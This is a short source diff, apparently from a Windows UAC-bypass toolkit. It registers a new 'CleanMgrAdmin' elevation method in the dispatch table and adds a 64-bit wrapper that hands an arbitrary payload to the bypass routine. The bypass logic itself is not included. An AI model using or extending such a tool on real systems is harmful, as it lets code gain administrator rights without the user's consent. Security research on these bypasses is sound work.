@@ -54,6 +54,7 @@ UCM_API(MethodAtlHijack);
 UCM_API(MethodSspiDatagram);
 UCM_API(MethodRequestTrace);
 UCM_API(MethodQuickAssist);
+UCM_API(MethodCleanMgrAdmin);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -71,7 +72,8 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodAtlHijack,
     UacMethodSspiDatagram,
     UacMethodRequestTrace,
-    UacMethodQuickAssist
+    UacMethodQuickAssist,
+    UacMethodCleanMgrAdmin
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -156,7 +158,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodTokenModUIAccess, { NT_WIN10_19H1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodRequestTrace, { NT_WIN11_24H2, NT_WIN11_25H2 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodCleanMgrAdmin, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -879,6 +882,18 @@ UCM_API(MethodQuickAssist)
 {
 #ifdef _WIN64
     return ucmQuickAssistMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
+}
+
+UCM_API(MethodCleanMgrAdmin)
+{
+#ifdef _WIN64
+    return ucmCleanMgrAdminMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 #else
